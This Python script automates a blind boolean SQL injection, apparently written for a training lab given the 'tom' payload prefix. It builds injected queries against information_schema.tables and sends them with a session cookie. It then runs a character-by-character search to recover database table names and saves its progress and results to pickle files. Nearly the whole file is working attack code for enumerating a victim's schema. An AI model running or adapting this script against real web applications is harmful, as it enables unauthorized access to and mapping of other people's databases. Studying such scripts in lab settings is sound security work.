import string
import pickle
from helpers import inject
import tabulate


def print_table_names():
    data = pickle.load(open('outputs/tables.pkl', 'rb'))
    print(tabulate.tabulate([[row] for row in data], headers=["Table Names"]))


def check_query(table_name):
    return f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
           f'table_name = \'{table_name}\')--'


def builder_query(length, word):
    return f'tom\' AND EXISTS (SELECT * FROM information_schema.tables WHERE ' \
           f'SUBSTRING(table_name, 1, {length})=\'{word}\')--'


def get_table_names(cookie):
    tables = []
    alphabets = string.ascii_letters + "_"
    queue = ['']
    all_table_names = []
    program_state = []

    while queue:
        queue_word = queue.pop(0)
        for a in alphabets:
            word = queue_word + a
            if inject.inject(cookie=cookie, query=builder_query(length=len(word), word=word)):
                print(f'Found Word: {word}, {len(word)}')
                all_table_names.append(word)
                queue.append(word)

        program_state.append([queue, all_table_names])
        pickle.dump(program_state, open('states/program_state.pkl', 'wb'))

    for table_name in all_table_names:
        if inject.check(cookie=cookie, query=check_query(table_name)):
            print(f'Found Table: {table_name}')
            tables.append(table_name)

    print(tables)
    pickle.dump(tables, open('outputs/tables.pkl', 'wb'))
